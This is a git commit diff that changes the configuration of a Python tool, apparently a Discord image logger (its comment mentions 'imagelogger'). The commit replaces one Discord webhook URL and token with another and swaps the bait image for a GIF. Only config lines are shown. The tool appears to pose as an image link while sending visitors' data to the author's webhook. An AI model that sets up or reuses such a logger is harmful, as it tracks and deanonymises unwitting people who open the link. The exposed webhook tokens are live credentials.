7a296cbd715d401a089a98258464965ff2692e1d
sasanasar2000-commits <sasanasar2000@gmail.com>
2026-03-30 09:30:39 +0300

    Update femboy.py

--- api/femboy.py
+++ api/femboy.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1488062192342536213/A1frvUNECLPgAmjSzU96hXAFjHDREWju84Qnakcw5PJUU-hsdn4EUb3BEQFdTmKoGFmi",
+    "image": "https://tenor.com/view/boy-kiss-er-gif-8460759050764009590", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
